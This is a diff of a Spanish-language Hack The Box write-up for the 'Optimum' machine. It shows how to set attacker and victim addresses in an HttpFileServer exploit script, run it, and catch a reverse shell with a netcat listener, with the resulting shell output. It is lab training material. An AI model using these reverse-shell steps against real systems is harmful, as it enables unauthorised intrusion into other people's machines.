@@ -48,8 +48,24 @@ Adicionalmente podemos realizar una busqueda en google tal como "HttpFileServer 
 
 Para poder ejecutar el script debemos de modificar el valor lhost y lport por nuestra IP local y el puerto a la escucha que vamos a usar para recibir la shell. Los valores rhost y rport corresponderan a la máquina víctima, en este caso:
 ```
-lhost = "10.10.14.121"
+lhost = "10.10.14.10"
 lport = 4444
 rhost = "10.10.10.8"
 rport = 80
+```
+
+Para ejecutar el exploit simplemente realizaremos:
+```
+python3 hfs.py
+```
+
+En nuestro netcat a la escucha deberíamos obtener una shell.
+```
+┌──(kali㉿kali)-[~/htb/optimum]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49163
+
+PS C:\Users\kostas\Desktop> whoami
+optimum\kostas
 ```
